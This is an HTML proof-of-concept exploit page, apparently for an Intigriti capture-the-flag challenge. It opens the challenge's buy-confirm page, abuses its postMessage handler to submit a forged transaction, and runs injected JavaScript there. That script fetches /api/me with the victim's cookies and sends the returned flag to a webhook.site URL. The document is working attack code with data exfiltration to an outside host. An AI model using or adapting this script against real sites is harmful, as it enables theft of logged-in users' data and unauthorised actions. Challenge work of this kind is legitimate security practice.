<!doctype html>
<html>
<body>
<script>
const target =
  "https://challenge-0126.intigriti.io/buy-confirm.html?currency=BTC&price=1";

// open victim page (1 click / automatic for bot)
const win = window.open(target);

// wait for page + wallets to load
setTimeout(() => {
  win.postMessage({
    type: 'submitTransaction',
    transaction: {
      currency: 'BTC',
      amount: 1,
      toAddress: 'x'
    }
  }, '*');

  // execute same-origin JS via trusted message handler
  win.eval(`
    fetch('/api/me',{credentials:'include'})
      .then(r=>r.json())
      .then(d=>{
        new Image().src =
          'https://webhook.site/3ae6a321-e1df-47a0-b4d3-ac23c1e28963?flag='
          + encodeURIComponent(d.flag);
      });
  `);
}, 2500);
</script>
</body>
</html>
